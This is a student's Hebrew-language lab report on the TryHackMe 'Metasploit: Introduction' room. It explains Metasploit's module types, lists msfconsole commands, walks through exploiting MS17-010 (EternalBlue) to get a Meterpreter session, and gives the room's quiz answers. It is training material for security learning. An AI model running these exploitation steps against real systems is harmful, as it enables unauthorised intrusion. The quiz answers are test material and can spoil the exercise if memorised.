🛡️ Penetration Test Report — Metasploit Introduction

Prepared by: Eylon Maayan
Platform: TryHackMe – Metasploit: Introduction
Date: 2025

📌 1. Executive Summary

מטרת התרגול הייתה להכיר את מסגרת Metasploit, להבין את יכולותיה, ולתרגל תהליך תקיפה מלא:
איתור חולשה, בחירת exploit, התאמת פרמטרים, שליחת payload וקבלת שליטה (Session) על המערכת.

במהלך התרגול בוצע ניצול של חולשת MS17-010 (EternalBlue), שימוש ב־msfconsole, הבנת סוגי המודולים, ביצוע סריקות, והבנת שלבי ה־post-exploitation.

החדר מהווה שלב נוסף בדרך לבניית מיומנויות התקפה והגנה כבסיס לקריירה ב־Cyber Defense / SOC.

📌 2. Scope

הדוח עוסק:

במבנה Metasploit Framework

סוגי מודולים (Exploits, Payloads, Auxiliary וכו')

תהליך העבודה בכלי

שימוש ב־EternalBlue לניצול חולשה

ניהול Sessions

מענה על כל השאלות שניתנו בחדר

📌 3. Objectives

להבין את מבנה Metasploit ואת ה־modules שלו

ללמוד כיצד לחפש ולבחור exploit מתאים

להגדיר פרמטרים: RHOSTS, LHOST, PAYLOAD

לבצע ניצול מוצלח של MS17-010

לנתח פלטים ולנהל sessions

להבין תהליך PT אמיתי — מהתחלה עד קבלת Shell

📌 4. Technical Overview
🔹 4.1 Components of Metasploit

Metasploit מורכב מארבע תת-מערכות מרכזיות:

רכיב	תפקיד
msfconsole	הממשק הראשי לביצוע תקיפות
Modules	יחידות קטנות המממשות פעולה (Exploit, Auxiliary וכו')
Payloads	קוד שרץ על היעד לאחר ניצול
Tools	כלים עצמאיים (msfvenom וכו')
סוגי מודולים:

Exploit – קוד המנצל חולשה

Payload – Shell / Command / Reverse TCP

Auxiliary – סורקים, פאזרים, מידע

Encoders – ניסיון לעקיפת AV

Evasion – מודולים ייעודיים לעקיפת הגנות

NOPs – ריפוד (0x90)

Post – איסוף מידע לאחר פריצה

📌 5. Metasploit Concepts
Exploit

קוד המנצל חולשה קיימת.

Vulnerability

טעות תכנות/עיצוב שמאפשרת ניצול.

Payload

הקוד שרץ על היעד ונותן שליטה לתוקף.

Session

ערוץ שליטה במערכת לאחר הצלחת exploit.

📌 6. Tools & Commands Used
הפעלת msfconsole
msfconsole

חיפוש מודולים
search ms17-010
search apache
search type:auxiliary ssh

טעינת מודול
use exploit/windows/smb/ms17_010_eternalblue

הצגת פרמטרים
show options

הגדרת פרמטרים
set RHOSTS 10.10.X.X
set LHOST 10.10.X.X
set LPORT 4444

הגדרת ערך גלובלי
setg RHOSTS 10.10.X.X

ניקוי ערך
unset PAYLOAD

הרצת exploit
exploit


או:

run

ניהול Sessions
sessions
sessions -i 1
background

📌 7. EternalBlue Exploitation (MS17-010)

ניצול החולשה כלל:

טעינת המודול:

use exploit/windows/smb/ms17_010_eternalblue


הגדרת כתובת היעד:

set RHOSTS <victim-ip>


בדיקת המידע:

show options


ביצוע exploit:

exploit


קבלת Meterpreter Session:

meterpreter >


העברת הסשן לרקע:

background

📌 8. Answers to Room Questions
✔ What is the name of the code taking advantage of a flaw on the target system?

Exploit

✔ What is the code that runs on the target system?

Payload

✔ What are self-contained payloads called?

Singles

✔ Is windows/x64/pingback_reverse_tcp single or staged?

Staged

✔ Search for a module related to Apache

search apache

✔ Who provided the ssh_login module?

todb

✔ Set LPORT to 6666
set LPORT 6666

✔ Set global RHOSTS to 10.10.19.23
setg RHOSTS 10.10.19.23

✔ Clear a payload
unset PAYLOAD

✔ Command to execute the exploit
exploit

📌 9. Conclusions

החדר הדגים את שלבי העבודה המעשיים של תקיפה:

הבנת מבנה Metasploit

זיהוי חולשות

שימוש ב־search למציאת Exploits

הגדרת פרמטרים קריטיים

ביצוע תקיפה מלאה על EternalBlue

קבלת Shell

עבודה עם Meterpreter

זוהי אבן דרך משמעותית נוספת בתהליך ההכשרה שלי כאנליסט סייבר וטכנאי Red Team/Blue Team.

📌 10. Recommendation for Improvement

לבסס הבנה עמוקה יותר:

לעבור לחדר Metasploit Intermediate

לבצע פרויקט PT עצמאי עם Metasploit + Nmap

לתרגל exploitation ב־HackTheBox

ללמוד מודולים כמו Kiwi, Hashdump, Mimikatz

לשלב בין Metasploit + OSINT + Network Scanning
